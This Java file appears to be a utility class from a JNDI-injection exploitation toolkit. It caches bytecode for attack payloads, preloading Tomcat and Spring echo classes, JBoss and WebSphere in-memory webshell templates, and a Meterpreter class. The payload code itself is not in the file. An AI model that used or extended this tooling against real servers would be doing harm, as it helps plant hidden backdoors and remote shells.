package com.qi4l.jndi.gadgets.utils;

import com.qi4l.jndi.template.*;
import com.qi4l.jndi.template.memshell.Websphere.WebsphereMemshellTemplate;
import com.qi4l.jndi.template.echo.SpringEcho;
import com.qi4l.jndi.template.echo.TomcatEcho;
import com.qi4l.jndi.template.memshell.jboss.JBFMSFromContextF;
import net.jodah.expiringmap.ExpirationPolicy;
import net.jodah.expiringmap.ExpiringMap;
import java.util.concurrent.TimeUnit;

public class Cache {
    private static ExpiringMap<String, byte[]> map = ExpiringMap.builder()
            .maxSize(1000)
            .expiration(30, TimeUnit.SECONDS)
            .variableExpiration()
            .expirationPolicy(ExpirationPolicy.CREATED)
            .build();

    static{
        try {
            //过期时间100年，永不过期的简单方法
            map.put("TomcatEcho", Util.getClassBytes(TomcatEcho.class), 365 * 100, TimeUnit.DAYS);
            map.put("SpringEcho", Util.getClassBytes(SpringEcho.class), 365 * 100, TimeUnit.DAYS);
            map.put("JBossMemshellTemplate", Util.getClassBytes(JBFMSFromContextF.class), 365 * 100, TimeUnit.DAYS);
            map.put("WebsphereMemshellTemplate", Util.getClassBytes(WebsphereMemshellTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("isOK", Util.getClassBytes(isOK.class), 365 * 100, TimeUnit.DAYS);
            //测试添加到cache中
            map.put("isSuccess", Util.getClassBytes(isSuccess.class),365 * 100, TimeUnit.DAYS);
            map.put("Meterpreter", ClassByteChange.update(Meterpreter.class),365 * 100, TimeUnit.DAYS);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] get(String key){
        return map.get(key);
    }

    public static void set(String key, byte[] bytes){
        map.put(key, bytes);
    }

    public static boolean contains(String key){
        return map.containsKey(key);
    }

    public static void remove(String key){
        map.remove(key);
    }
}
